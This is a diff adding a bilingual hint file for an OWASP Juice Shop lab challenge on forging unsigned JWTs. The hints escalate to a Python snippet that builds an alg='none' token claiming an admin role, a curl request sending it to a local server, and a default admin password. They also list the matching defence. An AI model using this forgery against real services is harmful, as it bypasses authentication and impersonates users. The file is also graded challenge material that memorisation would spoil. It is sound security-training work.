@@ -1,0 +1,175 @@
+challenge_key: "jwtUnsignedChallenge"
+schema_version: "juicelab.hints.v2"
+
+hints:
+  N1:
+    cost_pct: 5
+    text_fr: |
+      Hint OWASP officiel #1 : "This challenge exploits
+      a weird option that is supported when signing
+      tokens with JWT". L'option weird = `alg: "none"`.
+      Hint #4 : "downgrading to no encryption at all".
+      Hint #5 : URL-safe encoding (base64url).
+    text_en: |
+      Official OWASP hint #1: "This challenge exploits
+      a weird option that is supported when signing
+      tokens with JWT". The weird option = `alg:
+      "none"`. Hint #4: "downgrading to no encryption
+      at all". Hint #5: URL-safe encoding (base64url).
+    pedagogical_intent: |
+      Activate alg=none JWT vuln reflex.
+
+  N2:
+    cost_pct: 10
+    text_fr: |
+      Hint OWASP #2 : "begin with retrieving a valid
+      JWT from the application's Authorization request
+      header". Donc login Juice Shop normal, puis
+      copy le JWT depuis Authorization header
+      (DevTools Network tab, ou localStorage `token`).
+      Hint #3 : JWT a une expiration courte, fais vite.
+    text_en: |
+      OWASP hint #2: "begin with retrieving a valid
+      JWT from the application's Authorization
+      request header". So normal Juice Shop login,
+      then copy JWT from Authorization header
+      (DevTools Network tab, or localStorage
+      `token`). Hint #3: JWT has short expiration,
+      be fast.
+    pedagogical_intent: |
+      Spell JWT acquisition.
+
+  N3:
+    cost_pct: 20
+    text_fr: |
+      Decode le JWT sur jwt.io (paste dans le
+      decoder). Tu vois 3 parts : header (`{alg:
+      "RS256", typ: "JWT"}` ou similar), payload
+      (`{data: {email: "your@email", id: ..., ...}}`),
+      signature. Pour le forger : (a) modifier header
+      en `{"alg":"none","typ":"JWT"}`, (b) modifier
+      payload pour `data.email = "jwtn3d@juice-
+      sh.op"`, (c) signature vide.
+    text_en: |
+      Decode JWT on jwt.io (paste in decoder). You
+      see 3 parts: header (`{alg: "RS256", typ:
+      "JWT"}` or similar), payload (`{data: {email:
+      "your@email", id: ..., ...}}`), signature. To
+      forge: (a) modify header to
+      `{"alg":"none","typ":"JWT"}`, (b) modify
+      payload to `data.email = "jwtn3d@juice-
+      sh.op"`, (c) empty signature.
+    pedagogical_intent: |
+      Spell forge mechanic.
+
+  N4:
+    cost_pct: 35
+    text_fr: |
+      [KILL_CHAIN_DOCUMENTED] Construction du JWT
+      forge : Python helper :
+        ```python
+        import base64, json
+        h = json.dumps({"alg":"none","typ":"JWT"})
+        p = json.dumps({"data":{"email":"jwtn3d@juice-sh.op","id":1,"role":"admin"}})
+        b64 = lambda s: base64.urlsafe_b64encode(
+            s.encode()).rstrip(b'=').decode()
+        token = f"{b64(h)}.{b64(p)}."  # signature
+                                        # vide
+        print(token)
+        ```
+      Submit avec : `Authorization: Bearer
+      <forged-token>` sur n'importe quel endpoint
+      authenticated (ex. GET /rest/user/whoami).
+      Source serveur verifiee : routes/verify.ts:82
+      verifie alg='none' literal + email matches
+      /jwtn3d@/.
+    text_en: |
+      [KILL_CHAIN_DOCUMENTED] Forge JWT
+      construction: Python helper:
+        ```python
+        import base64, json
+        h = json.dumps({"alg":"none","typ":"JWT"})
+        p = json.dumps({"data":{"email":"jwtn3d@juice-sh.op","id":1,"role":"admin"}})
+        b64 = lambda s: base64.urlsafe_b64encode(
+            s.encode()).rstrip(b'=').decode()
+        token = f"{b64(h)}.{b64(p)}."  # empty
+                                        # signature
+        print(token)
+        ```
+      Submit with: `Authorization: Bearer
+      <forged-token>` on any authenticated
+      endpoint (e.g., GET /rest/user/whoami).
+      Verified server source: routes/verify.ts:82
+      checks alg='none' literal + email matches
+      /jwtn3d@/.
+    pedagogical_intent: |
+      Spell exact payload forge.
+
+  N5:
+    cost_pct: 50
+    text_fr: |
+      [KILL_CHAIN_DOCUMENTED] Workflow complet :
+      1. Login Juice Shop (n'importe quel compte ;
+         /#/login avec admin/admin123 si solu).
+      2. F12 -> Application -> Local Storage -> copy
+         `token` value (c'est ton JWT valide).
+      3. Decode sur jwt.io ou via Python script.
+      4. Modifier header :
+         `{"alg":"none","typ":"JWT"}`. Modifier
+         payload `data.email` -> `jwtn3d@juice-sh.op`
+         (preserver autres fields).
+      5. Re-encoder header + payload en base64url
+         (sans padding `=`). Concatener
+         `header.payload.` (point final + signature
+         vide).
+      6. Submit toute requete authenticated avec
+         `Authorization: Bearer <forged_token>`.
+         Exemple : `curl -H "Authorization: Bearer
+         eyJhbGciOiJub25lIn0.eyJkYXRhIjp7ImVtYWls
+         IjoiandtbjNkQGp1aWNlLXNoLm9wIn19."
+         http://localhost:3000/rest/user/whoami`.
+      7. Le serveur (express-jwt 0.1.3 vulnerable)
+         accepte le token alg=none.
+      8. Le solve check (routes/verify.ts:82) :
+         alg=='none' && email matches /jwtn3d@/ ->
+         match -> challenge solve auto.
+      Source canonique : routes/verify.ts:82-83 +
+      108-130 (jwtChallenge function) + RFC 7519 +
+      CVE-2015-9235 (express-jwt 0.1.3).
+      Defense canonique : whitelist algorithms
+      explicit dans jwt.verify(), update express-jwt
+      >= 6.0, eviter alg=none entierement.
+    text_en: |
+      [KILL_CHAIN_DOCUMENTED] Full workflow:
+      1. Login Juice Shop (any account; /#/login
+         with admin/admin123 if solved).
+      2. F12 -> Application -> Local Storage ->
+         copy `token` value (your valid JWT).
+      3. Decode on jwt.io or via Python script.
+      4. Modify header:
+         `{"alg":"none","typ":"JWT"}`. Modify
+         payload `data.email` -> `jwtn3d@juice-
+         sh.op` (preserve other fields).
+      5. Re-encode header + payload in base64url
+         (no `=` padding). Concatenate
+         `header.payload.` (trailing dot + empty
+         signature).
+      6. Submit any authenticated request with
+         `Authorization: Bearer <forged_token>`.
+         Example: `curl -H "Authorization: Bearer
+         eyJhbGciOiJub25lIn0.eyJkYXRhIjp7ImVtYWls
+         IjoiandtbjNkQGp1aWNlLXNoLm9wIn19."
+         http://localhost:3000/rest/user/whoami`.
+      7. Server (vulnerable express-jwt 0.1.3)
+         accepts alg=none token.
+      8. Solve check (routes/verify.ts:82):
+         alg=='none' && email matches /jwtn3d@/ ->
+         match -> challenge auto solves.
+      Canonical source: routes/verify.ts:82-83 +
+      108-130 (jwtChallenge function) + RFC 7519 +
+      CVE-2015-9235 (express-jwt 0.1.3).
+      Canonical defense: explicit algorithm
+      whitelist in jwt.verify(), update express-jwt
+      >= 6.0, avoid alg=none entirely.
+    pedagogical_intent: |
+      Quasi-solution : workflow + curl + defense.
